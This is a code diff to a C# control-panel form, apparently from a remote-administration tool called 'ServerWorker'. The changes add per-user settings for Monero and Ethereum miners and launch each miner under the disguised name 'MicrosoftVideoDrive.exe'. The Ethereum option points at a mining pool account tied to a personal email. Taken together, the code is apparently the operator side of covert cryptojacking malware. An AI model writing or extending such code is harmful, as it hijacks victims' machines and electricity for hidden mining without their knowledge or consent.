@@ -21,6 +21,7 @@ namespace ServerWorker
         private LogUserCard log;
         private PictureForm picture;
 
+        
 
         public FormUserCard(User user)
         {
@@ -41,7 +42,33 @@ namespace ServerWorker
                     Log.Send("FormUserCard: " + ex.Message);
                 }
             }
+
+            user.userData.setting = user.UsersCom.GetSetting();
+            comboBox1.SelectedIndex = (int)user.userData.setting.MValut;
+
+            comboBox1.SelectedIndexChanged += (object sender, EventArgs e) => 
+                SetMinerSettings((DDMiners)comboBox1.SelectedIndex);
+
             DrawUserInfoDevice();
+        }
+
+        private void SetMinerSettings(DDMiners valute)
+        {
+            switch (valute)
+            {
+                case DDMiners.none:
+                    user.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
+                    break;
+                case DDMiners.XMR_N:
+                    user.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
+                    break;
+                case DDMiners.XMR_A:
+                    user.UsersCom.SetMSettings(@"M\XMRA", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_A);
+                    break;
+                case DDMiners.ETH_N:
+                    user.UsersCom.SetMSettings(@"M\ETHN", "Data", "MicrosoftVideoDrive.exe", "-U -S eth.pool.minergate.com:45791 -u xismatulin.ru@yandex.ru --cuda-parallel-hash 4", true, DDMiners.ETH_N);
+                    break;
+            }
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -129,7 +156,7 @@ namespace ServerWorker
 
         private void button4_Click_1(object sender, EventArgs e)
         {
-            user.UsersCom.RunM(@"Data\Miner.exe","");
+            user.UsersCom.RunM();
         }
 
 
@@ -212,6 +239,16 @@ namespace ServerWorker
             listBox2.Items.Add(user.userData.setting.Start_time);
             listBox2.Items.Add("<<===Version===>>");
             listBox2.Items.Add(user.userData.setting.Version);
+            listBox2.Items.Add("<<===MFTPFloader===>>");
+            listBox2.Items.Add(user.userData.setting.MFTPFloader);
+            listBox2.Items.Add("<<===MLocalFloader===>>");
+            listBox2.Items.Add(user.userData.setting.MLocalFloader);
+            listBox2.Items.Add("<<===MFileName===>>");
+            listBox2.Items.Add(user.userData.setting.MFileName);
+            listBox2.Items.Add("<<===MArgs===>>");
+            listBox2.Items.Add(user.userData.setting.MArgs);
+            listBox2.Items.Add("<<===MValut===>>");
+            listBox2.Items.Add(user.userData.setting.MValut);
         }
     }
 }
